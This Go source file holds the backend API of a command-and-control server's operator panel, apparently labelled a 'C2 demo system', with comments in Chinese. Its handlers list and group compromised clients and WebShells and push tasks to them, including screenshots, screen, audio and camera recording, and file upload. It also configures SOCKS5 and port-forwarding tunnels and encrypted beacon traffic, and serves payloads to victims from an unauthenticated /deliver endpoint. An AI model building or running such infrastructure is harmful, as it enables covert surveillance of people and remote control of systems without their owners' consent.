package main

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// ============ 仪表盘 API（与 app.py /api/dashboard/stats 对齐）============

func handleDashboardStats(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	totalClients, _ := queryOne("SELECT COUNT(*) as cnt FROM clients")
	onlineClients, _ := queryOne("SELECT COUNT(*) as cnt FROM clients WHERE status='online'")
	totalTasks, _ := queryOne("SELECT COUNT(*) as cnt FROM tasks")
	todayTasks, _ := queryOne("SELECT COUNT(*) as cnt FROM tasks WHERE date(created_at)=date('now')")

	tc := getInt(totalClients, "cnt", 0)
	oc := getInt(onlineClients, "cnt", 0)
	tt := getInt(totalTasks, "cnt", 0)
	td := getInt(todayTasks, "cnt", 0)

	// OS 分布
	osStats := map[string]int64{}
	osRows, _ := queryAll("SELECT os, COUNT(*) as cnt FROM clients GROUP BY os")
	for _, row := range osRows {
		os := getString(row, "os", "unknown")
		if os == "" {
			os = "unknown"
		}
		osStats[os] = getInt(row, "cnt", 0)
	}

	// 分组分布
	groupStats := map[string]int64{}
	groupRows, _ := queryAll("SELECT group_name, COUNT(*) as cnt FROM clients GROUP BY group_name")
	for _, row := range groupRows {
		groupStats[getString(row, "group_name", "default")] = getInt(row, "cnt", 0)
	}

	// 7 天上线趋势
	weekData := []map[string]interface{}{}
	for i := 6; i >= 0; i-- {
		date := time.Now().AddDate(0, 0, -i).Format("2006-01-02")
		row, _ := queryOne("SELECT COUNT(*) as cnt FROM clients WHERE date(first_seen)=?", date)
		weekData = append(weekData, map[string]interface{}{
			"date":  date,
			"count": getInt(row, "cnt", 0),
		})
	}

	jsonOK(w, map[string]interface{}{
		"total_clients":     tc,
		"online_clients":    oc,
		"offline_clients":   tc - oc,
		"total_tasks":       tt,
		"today_tasks":       td,
		"os_stats":          osStats,
		"group_stats":       groupStats,
		"week_data":         weekData,
		"country_stats":     map[string]int64{},
		"total_traffic_kb":  0,
		"protocol_stats":    map[string]int64{},
		"task_type_stats":   map[string]int64{},
	})
}

// ============ 客户端 API（与 app.py /api/clients 对齐）============

func handleListClients(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	group := r.URL.Query().Get("group")
	clientType := r.URL.Query().Get("type")

	query := "SELECT * FROM clients WHERE 1=1"
	args := []interface{}{}

	if group != "" {
		query += " AND group_name=?"
		args = append(args, group)
	}
	if clientType != "" {
		query += " AND client_type=?"
		args = append(args, clientType)
	}
	query += " ORDER BY last_seen DESC"

	clients, err := queryAll(query, args...)
	if err != nil {
		jsonError(w, "查询失败: "+err.Error(), http.StatusInternalServerError)
		return
	}
	// 返回全部客户端（包含 WebShell），前端自行在主机管理页面过滤
	// 操作页面（终端/文件/屏幕/隧道）的客户端选择器需要包含 WebShell
	if clients == nil {
		clients = []map[string]interface{}{}
	}
	jsonOK(w, clients)
}

func handleGetClient(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	clientID := r.PathValue("client_id")
	client, _ := queryOne("SELECT * FROM clients WHERE client_id=?", clientID)
	if client == nil {
		jsonError(w, "客户端不存在", http.StatusNotFound)
		return
	}
	jsonOK(w, client)
}

func handleDeleteClient(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	clientID := r.PathValue("client_id")
	dbExec("DELETE FROM clients WHERE client_id=?", clientID)
	dbExec("DELETE FROM tasks WHERE client_id=?", clientID)
	addLog("client", fmt.Sprintf("删除客户端: %s", clientID), clientID, user.UserID, getRequestIP(r))
	broadcastClientUpdate()
	jsonOK(w, map[string]interface{}{"success": true})
}

// ============ Session 管理 API（与 app.py /api/sessions 对齐）============

func handleListSessions(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	sessions, _ := queryAll("SELECT * FROM clients WHERE session_id IS NOT NULL ORDER BY last_seen DESC")
	jsonOK(w, sessions)
}

func handleKillSession(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	sessionID := r.PathValue("session_id")
	dbExec("UPDATE clients SET session_state='dead' WHERE session_id=?", sessionID)
	addLog("client", fmt.Sprintf("Kill Session: %s", sessionID), "", user.UserID, getRequestIP(r))
	broadcastClientUpdate()
	jsonOK(w, map[string]interface{}{"success": true})
}

func handleInteractSession(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	sessionID := r.PathValue("session_id")
	expires := time.Now().Add(30 * time.Minute).Format("2006-01-02 15:04:05")
	dbExec("UPDATE clients SET session_state='active', interact_expires=? WHERE session_id=?", expires, sessionID)
	jsonOK(w, map[string]interface{}{"success": true, "session_id": sessionID})
}

func handleBatchKillSessions(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	var data struct {
		SessionIDs []string `json:"session_ids"`
	}
	if err := decodeJSON(r, &data); err != nil {
		jsonError(w, "Invalid request", http.StatusBadRequest)
		return
	}
	for _, sid := range data.SessionIDs {
		dbExec("UPDATE clients SET session_state='dead' WHERE session_id=?", sid)
	}
	addLog("client", fmt.Sprintf("批量 Kill Session: %d 个", len(data.SessionIDs)), "", user.UserID, getRequestIP(r))
	broadcastClientUpdate()
	jsonOK(w, map[string]interface{}{"success": true})
}

// ============ 分组 API（与 app.py /api/groups 对齐）============

func handleListGroups(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	groups, _ := queryAll("SELECT * FROM groups ORDER BY name")
	jsonOK(w, groups)
}

func handleCreateGroup(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	var data struct {
		Name        string `json:"name"`
		Description string `json:"description"`
	}
	if err := decodeJSON(r, &data); err != nil {
		jsonError(w, "Invalid request", http.StatusBadRequest)
		return
	}
	if data.Name == "" {
		jsonError(w, "分组名不能为空", http.StatusBadRequest)
		return
	}
	dbExec("INSERT INTO groups (name, description) VALUES (?, ?)", data.Name, data.Description)
	addLog("group", fmt.Sprintf("创建分组: %s", data.Name), "", user.UserID, getRequestIP(r))
	jsonOK(w, map[string]interface{}{"success": true})
}

func handleSetClientGroup(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	var data struct {
		ClientIDs []string `json:"client_ids"`
		Group     string   `json:"group"`
	}
	if err := decodeJSON(r, &data); err != nil {
		jsonError(w, "Invalid request", http.StatusBadRequest)
		return
	}
	for _, cid := range data.ClientIDs {
		dbExec("UPDATE clients SET group_name=? WHERE client_id=?", data.Group, cid)
	}
	addLog("group", fmt.Sprintf("设置 %d 个客户端分组为: %s", len(data.ClientIDs), data.Group), "", user.UserID, getRequestIP(r))
	broadcastClientUpdate()
	jsonOK(w, map[string]interface{}{"success": true})
}

// ============ 任务 API（与 app.py /api/task/* 对齐）============

func handleSendTask(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	var data struct {
		ClientIDs []string                 `json:"client_ids"`
		TaskType  string                   `json:"task_type"`
		TaskData  map[string]interface{}   `json:"task_data"`
	}
	if err := decodeJSON(r, &data); err != nil {
		jsonError(w, "Invalid request", http.StatusBadRequest)
		return
	}
	if len(data.ClientIDs) == 0 || data.TaskType == "" {
		jsonError(w, "参数错误", http.StatusBadRequest)
		return
	}

	taskDataJSON, _ := json.Marshal(data.TaskData)
	taskIDs := []int64{}
	for _, cid := range data.ClientIDs {
		tid, _ := dbExec("INSERT INTO tasks (client_id, task_type, task_data, status, created_at) VALUES (?, ?, ?, 'pending', ?)",
			cid, data.TaskType, string(taskDataJSON), nowLocal())
		taskIDs = append(taskIDs, tid)
	}

	addLog("task", fmt.Sprintf("下发任务: %s, 目标数量: %d", data.TaskType, len(data.ClientIDs)), "", user.UserID, getRequestIP(r))
	broadcastTaskUpdate()

	jsonOK(w, map[string]interface{}{"success": true, "task_ids": taskIDs})
}

func handleListTasks(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	clientID := r.URL.Query().Get("client_id")
	status := r.URL.Query().Get("status")

	query := "SELECT * FROM tasks WHERE 1=1"
	args := []interface{}{}
	if clientID != "" {
		query += " AND client_id=?"
		args = append(args, clientID)
	}
	if status != "" {
		query += " AND status=?"
		args = append(args, status)
	}
	query += " ORDER BY created_at DESC LIMIT 100"

	tasks, err := queryAll(query, args...)
	if err != nil {
		jsonError(w, "查询失败", http.StatusInternalServerError)
		return
	}
	if tasks == nil {
		tasks = []map[string]interface{}{}
	}
	jsonOK(w, tasks)
}

func handleGetTask(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	taskID := r.PathValue("task_id")
	task, _ := queryOne("SELECT * FROM tasks WHERE id=?", taskID)
	if task == nil {
		jsonError(w, "任务不存在", http.StatusNotFound)
		return
	}
	jsonOK(w, task)
}

func handleDeleteTask(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	taskID := r.PathValue("task_id")
	dbExec("DELETE FROM tasks WHERE id=?", taskID)
	broadcastTaskUpdate()
	jsonOK(w, map[string]interface{}{"success": true})
}

// ============ 日志 API（与 app.py /api/logs 对齐）============

func handleListLogs(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	logType := r.URL.Query().Get("type")
	keyword := r.URL.Query().Get("keyword")

	query := "SELECT * FROM logs WHERE 1=1"
	args := []interface{}{}
	if logType != "" {
		query += " AND type=?"
		args = append(args, logType)
	}
	if keyword != "" {
		query += " AND content LIKE ?"
		args = append(args, "%"+keyword+"%")
	}
	query += " ORDER BY created_at DESC LIMIT 200"

	logs, err := queryAll(query, args...)
	if err != nil {
		jsonError(w, "查询失败", http.StatusInternalServerError)
		return
	}
	if logs == nil {
		logs = []map[string]interface{}{}
	}
	jsonOK(w, logs)
}

func handleExportLogs(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	logs, _ := queryAll("SELECT * FROM logs ORDER BY created_at DESC LIMIT 1000")

	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
	w.Header().Set("Content-Disposition", "attachment; filename=c2_logs.csv")
	// BOM 头（Excel 兼容）
	w.Write([]byte{0xEF, 0xBB, 0xBF})

	writer := csv.NewWriter(w)
	writer.Write([]string{"ID", "类型", "内容", "客户端ID", "用户ID", "IP", "时间"})
	for _, log := range logs {
		writer.Write([]string{
			fmt.Sprintf("%d", getInt(log, "id", 0)),
			getString(log, "type", ""),
			getString(log, "content", ""),
			getString(log, "client_id", ""),
			fmt.Sprintf("%d", getInt(log, "user_id", 0)),
			getString(log, "ip", ""),
			getString(log, "created_at", ""),
		})
	}
	writer.Flush()
}

func handleClearLogs(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	var data struct {
		Type string `json:"type"`
	}
	decodeJSON(r, &data)
	if data.Type != "" && data.Type != "all" {
		dbExec("DELETE FROM logs WHERE type=?", data.Type)
	} else {
		dbExec("DELETE FROM logs", )
	}
	jsonOK(w, map[string]interface{}{"success": true})
}

// ============ 配置管理 API（与 app.py /api/settings 对齐）============

func handleGetSettings(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	jsonOK(w, getAllSettings())
}

func handleUpdateSettings(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	var data map[string]interface{}
	if err := decodeJSON(r, &data); err != nil {
		jsonError(w, "Invalid request", http.StatusBadRequest)
		return
	}

	updatedKeys := []string{}
	restartRequired := false

	// ============ 监听配置（嵌套 listen 对象）============
	// 注意: web host/port/protocol/ssl_cert/ssl_key 来自 config.json 文件，不再写入数据库
	// 这里只处理 callback_host / client_listen_port / tunnel_* 等数据库字段
	if listenRaw, ok := data["listen"]; ok {
		l, _ := listenRaw.(map[string]interface{})
		// 端口字段: 前端 key -> (DB key, 中文标签) —— 仅数据库存储的端口（web 端口来自 config.json 不在此列）
		portFields := map[string][2]string{
			"client_listen_port":    {"client_listen_port", "客户端监听"},
			"tunnel_port_forward":   {"tunnel_port_forward", "内网穿透-端口转发"},
			"tunnel_socks5_port":    {"tunnel_socks5_port", "内网穿透-SOCKS5"},
			"tunnel_http_proxy_port": {"tunnel_http_proxy_port", "内网穿透-HTTP代理"},
		}
		// 收集本次提交的端口，并与数据库已有值合并做全局唯一性校验
		allPorts := map[string]string{} // port值 -> 标签
		// 加入 config.json 中的 web 端口参与冲突校验
		cfg, _ := loadFileConfig()
		webPort := strconv.Itoa(cfg.Web.Port)
		if webPort != "" {
			allPorts[webPort] = "Web管理后台(config.json)"
		}
		for fk, meta := range portFields {
			dbKey, label := meta[0], meta[1]
			var pv string
			if v, exists := l[fk]; exists {
				pv = strings.TrimSpace(ifaceToString(v))
			} else {
				pv = getSetting(dbKey)
			}
			if pv == "" {
				continue
			}
			if prev, dup := allPorts[pv]; dup {
				jsonError(w, fmt.Sprintf("端口冲突: %s(%s) 与 %s(%s) 相同，必须互不相同", label, pv, prev, pv), http.StatusBadRequest)
				return
			}
			allPorts[pv] = label
		}
		// 字段映射: 前端 key -> DB key（web host/port/protocol/ssl_* 已移除，来自 config.json）
		listenKeyMap := map[string]string{
			"callback_host":          "callback_host",
			"client_listen_port":     "client_listen_port",
			"tunnel_port_forward":    "tunnel_port_forward",
			"tunnel_socks5_port":     "tunnel_socks5_port",
			"tunnel_http_proxy_port": "tunnel_http_proxy_port",
		}
		for k, v := range l {
			dbKey, ok := listenKeyMap[k]
			if !ok {
				continue
			}
			strVal := sanitizeSettingsValue(ifaceToString(v))
			setSetting(dbKey, strVal)
			updatedKeys = append(updatedKeys, dbKey)
		}
		// callback_host 修改需要重新刷新缓存
		if _, exists := l["callback_host"]; exists {
			updatedKeys = append(updatedKeys, "callback_host")
		}
	}

	// ============ 通信加密（嵌套 encryption 对象）============
	if encRaw, ok := data["encryption"]; ok {
		e, _ := encRaw.(map[string]interface{})
		if v, exists := e["algorithm"]; exists {
			setSetting("traffic_encryption", ifaceToString(v))
			updatedKeys = append(updatedKeys, "traffic_encryption")
		}
		if v, exists := e["password"]; exists {
			s := ifaceToString(v)
			if s != "" {
				setSetting("traffic_enc_password", s)
				updatedKeys = append(updatedKeys, "traffic_enc_password")
			}
		}
		if v, exists := e["aes_key"]; exists {
			s := ifaceToString(v)
			if s != "" {
				// AES Key 必须 16/24/32 字节
				if len(s) != 16 && len(s) != 24 && len(s) != 32 {
					jsonError(w, fmt.Sprintf("AES Key 长度必须为 16/24/32 字节，当前 %d 字节", len(s)), http.StatusBadRequest)
					return
				}
				setSetting("traffic_aes_key", s)
				updatedKeys = append(updatedKeys, "traffic_aes_key")
			}
		}
		if v, exists := e["xor_key"]; exists {
			s := ifaceToString(v)
			if s != "" {
				setSetting("traffic_xor_key", s)
				updatedKeys = append(updatedKeys, "traffic_xor_key")
			}
		}
		// 配置变更后立即刷新内存中的加密配置（无需重启服务）
		loadEncryptionConfig()
	}

	// ============ 客户端行为（嵌套 client 对象）============
	if clientRaw, ok := data["client"]; ok {
		c, _ := clientRaw.(map[string]interface{})
		clientKeyMap := map[string]string{
			"heartbeat_interval":  "client_heartbeat_interval",
			"task_poll_interval":  "client_task_poll_interval",
			"offline_timeout":     "client_offline_timeout",
			"reconnect_max":       "client_reconnect_max",
		}
		for k, v := range c {
			dbKey, ok := clientKeyMap[k]
			if !ok {
				continue
			}
			setSetting(dbKey, sanitizeSettingsValue(ifaceToString(v)))
			updatedKeys = append(updatedKeys, dbKey)
		}
	}

	// ============ 任务限制（嵌套 limits 对象）============
	if limitsRaw, ok := data["limits"]; ok {
		l, _ := limitsRaw.(map[string]interface{})
		limitsKeyMap := map[string]string{
			"screenshot_max_resolution": "screenshot_max_resolution",
			"record_max_duration":       "record_max_duration",
			"file_upload_max_mb":        "file_upload_max_mb",
		}
		for k, v := range l {
			dbKey, ok := limitsKeyMap[k]
			if !ok {
				continue
			}
			setSetting(dbKey, sanitizeSettingsValue(ifaceToString(v)))
			updatedKeys = append(updatedKeys, dbKey)
		}
	}

	// ============ 安全策略（嵌套 security 对象）============
	if secRaw, ok := data["security"]; ok {
		s, _ := secRaw.(map[string]interface{})
		secKeyMap := map[string]string{
			"session_timeout":     "session_timeout",
			"max_login_attempts":  "max_login_attempts",
			"login_lock_minutes":  "login_lock_minutes",
		}
		for k, v := range s {
			dbKey, ok := secKeyMap[k]
			if !ok {
				continue
			}
			setSetting(dbKey, sanitizeSettingsValue(ifaceToString(v)))
			updatedKeys = append(updatedKeys, dbKey)
		}
	}

	// ============ Webhook（嵌套 webhook 对象）============
	if whRaw, ok := data["webhook"]; ok {
		w2, _ := whRaw.(map[string]interface{})
		if v, exists := w2["enabled"]; exists {
			setSetting("webhook_enabled", ifaceToString(v))
			updatedKeys = append(updatedKeys, "webhook_enabled")
		}
		if v, exists := w2["url"]; exists {
			setSetting("webhook_url", sanitizeSettingsValue(ifaceToString(v)))
			updatedKeys = append(updatedKeys, "webhook_url")
		}
		if v, exists := w2["events"]; exists {
			setSetting("webhook_events", sanitizeSettingsValue(ifaceToString(v)))
			updatedKeys = append(updatedKeys, "webhook_events")
		}
	}

	// 刷新配置缓存
	refreshSettingsCache()
	loadEncryptionConfig()

	addLog("settings", fmt.Sprintf("更新系统配置: %s", strings.Join(updatedKeys, ", ")), "", user.UserID, getRequestIP(r))
	jsonOK(w, map[string]interface{}{"success": true, "updated": updatedKeys, "restart_required": restartRequired})
}

// ============ Webhook API（与 app.py /api/settings/webhook 对齐）============

func handleGetWebhook(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	jsonOK(w, map[string]interface{}{
		"enabled": getSettingDefault("webhook_enabled", "false") == "true",
		"url":     getSetting("webhook_url"),
		"events":  getSettingDefault("webhook_events", "login,client_online,payload,task"),
	})
}

func handleSetWebhook(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	var data struct {
		Enabled bool   `json:"enabled"`
		URL     string `json:"url"`
		Events  string `json:"events"`
	}
	if err := decodeJSON(r, &data); err != nil {
		jsonError(w, "Invalid request", http.StatusBadRequest)
		return
	}
	enabledStr := "false"
	if data.Enabled {
		enabledStr = "true"
	}
	setSetting("webhook_enabled", enabledStr)
	setSetting("webhook_url", data.URL)
	setSetting("webhook_events", data.Events)
	addLog("settings", "更新Webhook配置", "", user.UserID, getRequestIP(r))
	jsonOK(w, map[string]interface{}{"success": true})
}

func handleTestWebhook(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	var data struct {
		URL string `json:"url"`
	}
	if err := decodeJSON(r, &data); err != nil {
		jsonError(w, "Invalid request", http.StatusBadRequest)
		return
	}
	if data.URL == "" {
		jsonError(w, "Webhook URL不能为空", http.StatusBadRequest)
		return
	}
	// 异步发送测试消息
	go func() {
		payload := map[string]interface{}{
			"type":    "test",
			"content": "Webhook测试消息 - C2演示系统",
			"timestamp": time.Now().Format("2006-01-02 15:04:05"),
		}
		body, _ := json.Marshal(payload)
		_ = httpPostRaw(data.URL, body)
	}()
	jsonOK(w, map[string]interface{}{"success": true})
}

// ============ Payload 列表 API（与 app.py /api/payloads 对齐）============

func handleListPayloads(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	payloads, _ := queryAll("SELECT * FROM payloads ORDER BY created_at DESC")
	if payloads == nil {
		payloads = []map[string]interface{}{}
	}
	// 补充 delivery_url 和 download_filename 字段，供前端直接使用
	c2Server := fmt.Sprintf("%s://%s:%s", getListenProtocol(), getCallbackHost(), getListenPort())
	for _, p := range payloads {
		token := getString(p, "delivery_token", "")
		if token != "" {
			p["delivery_url"] = fmt.Sprintf("%s/deliver/%s", c2Server, token)
		}
		fp := getString(p, "file_path", "")
		if fp != "" {
			p["download_filename"] = filepath.Base(fp)
		}
	}
	jsonOK(w, payloads)
}

func handleDeletePayload(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	pid := r.PathValue("pid")
	payload, _ := queryOne("SELECT * FROM payloads WHERE id=?", pid)
	if payload != nil {
		filePath := getString(payload, "file_path", "")
		if filePath != "" && fileExists(filePath) {
			os.Remove(filePath)
		}
		dbExec("DELETE FROM payloads WHERE id=?", pid)
	}
	jsonOK(w, map[string]interface{}{"success": true})
}

func handleClearPayloads(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	payloads, _ := queryAll("SELECT file_path FROM payloads")
	for _, p := range payloads {
		fp := getString(p, "file_path", "")
		if fp != "" && fileExists(fp) {
			os.Remove(fp)
		}
	}
	dbExec("DELETE FROM payloads")
	jsonOK(w, map[string]interface{}{"success": true})
}

// handleClearMedia 清空所有媒体历史记录（截图/录屏/录音/摄像头）
// 删除 tasks 表中媒体类型记录 + 删除 tmp/screenshots、tmp/recordings、tmp/audio 目录下所有文件
func handleClearMedia(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	// 媒体任务类型
	mediaTypes := []string{"screenshot", "record_screen", "record_audio", "camera_photo", "camera_record"}

	// 删除媒体任务记录
	for _, mt := range mediaTypes {
		dbExec("DELETE FROM tasks WHERE task_type=?", mt)
	}

	// 清空媒体资源目录
	subdirs := []string{"screenshots", "recordings", "audio"}
	deletedFiles := 0
	for _, sub := range subdirs {
		dir := filepath.Join(getTmpDir(), sub)
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}
			fp := filepath.Join(dir, entry.Name())
			if err := os.Remove(fp); err == nil {
				deletedFiles++
			}
		}
	}

	addLog("media", fmt.Sprintf("清空媒体历史记录，删除 %d 个资源文件", deletedFiles), "", user.UserID, getRequestIP(r))
	jsonOK(w, map[string]interface{}{"success": true, "deleted_files": deletedFiles})
}

// ============ 资源文件 API（与 app.py /api/resource/<path> 对齐）============
// 路由: /api/resource/<subdir>/<filename>

func handleResource(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	// 从 URL 提取路径: /api/resource/<subdir>/<filename>
	resPath := strings.TrimPrefix(r.URL.Path, "/api/resource/")
	resPath = strings.Trim(resPath, "/")
	if resPath == "" {
		http.NotFound(w, r)
		return
	}

	// 安全检查：防止路径遍历
	cleanPath := filepath.Clean(resPath)
	if strings.Contains(cleanPath, "..") {
		http.Error(w, "Invalid path", http.StatusBadRequest)
		return
	}

	fullPath := filepath.Join(getTmpDir(), cleanPath)
	if !fileExists(fullPath) {
		http.NotFound(w, r)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	http.ServeFile(w, r, fullPath)
}

// ============ 文件上传 API（与 app.py /api/file/upload 对齐）============

func handleFileUpload(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	// 限制上传大小
	maxMB, _ := strconv.ParseInt(getSettingDefault("file_upload_max_mb", "50"), 10, 64)
	maxBytes := maxMB * 1024 * 1024
	r.Body = http.MaxBytesReader(w, r.Body, maxBytes)

	if err := r.ParseMultipartForm(maxBytes); err != nil {
		jsonError(w, "文件太大或解析失败: "+err.Error(), http.StatusBadRequest)
		return
	}

	file, header, err := r.FormFile("file")
	if err != nil {
		jsonError(w, "获取文件失败: "+err.Error(), http.StatusBadRequest)
		return
	}
	defer file.Close()

	// 保存到 tmp/uploads/<client_id>/ 目录（与资源服务路径 /api/resource/uploads/<client_id>/<filename> 对齐）
	clientID := r.URL.Query().Get("client_id")
	if clientID == "" {
		clientID = "common"
	}
	safeName := sanitizeFilename(header.Filename)
	uploadSubDir := filepath.Join(getTmpDir(), "uploads", clientID)
	os.MkdirAll(uploadSubDir, 0755)
	dstPath := filepath.Join(uploadSubDir, safeName)
	dst, err := os.Create(dstPath)
	if err != nil {
		jsonError(w, "保存失败: "+err.Error(), http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	if _, err := io.Copy(dst, file); err != nil {
		jsonError(w, "写入失败: "+err.Error(), http.StatusInternalServerError)
		return
	}

	// 返回 URL 路径（前端用此路径拼接下载链接）
	urlPath := "/api/resource/uploads/" + clientID + "/" + safeName
	jsonOK(w, map[string]interface{}{
		"success":  true,
		"filename": header.Filename,
		"size":     header.Size,
		"path":     urlPath,
	})
}

// ============ 设置测试 API（与 app.py /api/settings/test 对齐）============

func handleSettingsTest(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	jsonOK(w, map[string]interface{}{
		"status":  "ok",
		"host":    getEffectiveHost(),
		"port":    getListenPort(),
		"ip":      getLocalIP(),
		"version": "Go-3.0",
	})
}

// handleReloadConfig 重新加载 config.json（修改 web ip/port 后点此按钮刷新内存配置）
// 注意: 修改 config.json 后仍需重启服务才能让新的 host/port 生效（监听地址在启动时绑定）
func handleReloadConfig(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	cfg, err := reloadFileConfig()
	if err != nil {
		jsonError(w, "config.json 加载失败: "+err.Error(), http.StatusInternalServerError)
		return
	}
	addLog("settings", fmt.Sprintf("重新加载 config.json: web=%s:%d (%s)", cfg.Web.Host, cfg.Web.Port, strings.ToUpper(cfg.Web.Protocol)), "", user.UserID, getRequestIP(r))
	jsonOK(w, map[string]interface{}{
		"success":           true,
		"web_host":          cfg.Web.Host,
		"web_port":          cfg.Web.Port,
		"web_protocol":      cfg.Web.Protocol,
		"restart_required":  true,
		"message":           "config.json 已重新加载。修改 host/port/protocol 需重启服务才能生效",
	})
}

// ============ 截图 API（与 app.py /api/screenshot/<client_id> 对齐）============

func handleScreenshot(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	clientID := r.PathValue("client_id")
	// 下发截图任务
	taskDataJSON, _ := json.Marshal(map[string]interface{}{
		"resolution": getSettingDefault("screenshot_max_resolution", "720p"),
	})
	tid, _ := dbExec("INSERT INTO tasks (client_id, task_type, task_data, status, created_at) VALUES (?, 'screenshot', ?, 'pending', ?)",
		clientID, string(taskDataJSON), nowLocal())
	broadcastTaskUpdate()
	jsonOK(w, map[string]interface{}{"success": true, "task_id": tid})
}

// ============ Payload 下载 API（与 app.py /deliver/<token> 对齐）============
// 路由: /deliver/{token}  无需认证

func handleDeliver(w http.ResponseWriter, r *http.Request) {
	// 从 URL 提取 token: /deliver/<token>
	token := strings.TrimPrefix(r.URL.Path, "/deliver/")
	token = strings.Trim(token, "/")
	if token == "" {
		http.NotFound(w, r)
		return
	}
	payload, _ := queryOne("SELECT * FROM payloads WHERE delivery_token=?", token)
	if payload == nil {
		http.NotFound(w, r)
		return
	}

	filePath := getString(payload, "file_path", "")
	if filePath == "" || !fileExists(filePath) {
		http.NotFound(w, r)
		return
	}

	name := getString(payload, "name", "payload")
	// 从 file_path 提取原始扩展名
	ext := filepath.Ext(filePath)
	if ext != "" && !strings.HasSuffix(name, ext) {
		name += ext
	}
	w.Header().Set("Content-Disposition", "attachment; filename="+name)
	http.ServeFile(w, r, filePath)
}

// ============ Payload 下载（按文件名）============
// 路由: /api/payload/download/<filename>
// 认证: Authorization header 或 ?token=xxx query 参数（window.open 无法带 header）

func handlePayloadDownload(w http.ResponseWriter, r *http.Request, user tokenInfo) {
	// 从 URL 提取 filename: /api/payload/download/<filename>
	filename := strings.TrimPrefix(r.URL.Path, "/api/payload/download/")
	filename = strings.Trim(filename, "/")
	if filename == "" {
		http.NotFound(w, r)
		return
	}
	// 防止路径穿越
	filename = filepath.Base(filename)
	fullPath := filepath.Join(payloadDir(), filename)
	if !fileExists(fullPath) {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Disposition", "attachment; filename="+filename)
	http.ServeFile(w, r, fullPath)
}

// httpPostRaw 发送原始 HTTP POST 请求（Webhook 测试用）
func httpPostRaw(url string, body []byte) error {
	resp, err := http.Post(url, "application/json", strings.NewReader(string(body)))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body)
	return nil
}
